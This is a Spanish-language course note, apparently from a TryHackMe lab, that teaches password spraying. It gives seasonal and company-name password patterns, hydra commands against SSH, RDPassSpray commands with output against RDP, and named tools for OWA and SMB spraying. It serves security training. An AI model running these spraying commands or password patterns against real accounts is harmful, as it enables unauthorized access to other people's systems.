---
layout: apunte
title: "9. Password Spray Attack"
---

Esta tarea te mostrará los fundamentos del ataque de password spraying y las herramientas necesitadas para realizarlo en varios escenarios contra servicios online comunes.

El password spraying es una técnica efectiva usada para identificar credenciales válidas. Hoy en día, el password spraying está considerado uno de los ataques más comunes contra contraseñas para descubrir contraseñas débiles. Esta técnica puede ser usada contra varios servicios online y sistemas de autentificación como SSH, SMB, RDP, SMPT, Outlook Web Application, etc. Un ataque de fuerza bruta apunta a un nombre de usuario específico para probar muchas contraseñas débiles, mientras que un ataque de password spraying, prueba varios nombres de usuario para una contraseña común.

Las contraseñas comunes y débiles suelen seguir un patrón y formato. Algunas muy usadas siguen el siguiente:

- La estación actual seguido del año actual: Fall2020, Spring20201...
- El mes actual seguido del año actual: November 2020, March2021...
- Usar el nombre de la compañía junto a números aleatorios: TryHackMe01, TryHackMe02...

Si la complejidad de la contraseña está reforzada por la organización, puede que tengamos que crear una contraseña que incluya símbolos para cumplir los requisitos, como `Octoober2021!`, `Spring2021!`, `October2021@`, etc.

Vamos a ver cómo aplicar dicho ataque a servicios online comunes:

-----------------------------------
<h2>SSH</h2>
Asume que ya hemos enumerado el sistema y creado una lista de nombres de usuario válidos.

```bash
cat usernames-list.txt
admin
victim
dummy
adm
sammy
```

Aquí vamos a usar `hydra` para realizar el ataque contra SSH, usando `Spring2021` como contraseña.

```bash
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

-----------------------
<h2>RDP</h2>
Asumamos que hemos encontrado un servicio RDP expuesto en el puerto 3026. Podemos usar una herramienta como [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) para realizar el ataque contra RDP. Primero, instalamos la herramienta en la máquina de atacante siguiendo las instrucciones del repositorio. Como nuevo usuario, empezaremos ejecutando el comando `python3 RDPassSpray.py -h` para ver cómo se puede usar:

```bash
user@THM:~$ python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Lab machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts
```

Ahora vamos a usar la opción `-u` para especificar `victim` como usuario y `-p` para configurar `Spring2021!` como contraseña. La opción `-t` es para seleccionar un ataque de host único.

```bash
ser@THM:~$ python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

>[!NOTE] Podemos especificar un dominio concreto con `-d`.

-------------------------------
<h2>Outlook Web Access (OWA) Portal</h2>
Herramientas:

- [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (automizer.py)
- [MailSniper](https://github.com/dafthack/MailSniper)

---------------------------------
<h2>SMB</h2>
Metasploit (auxiliary/scanner/smb/smb_login)

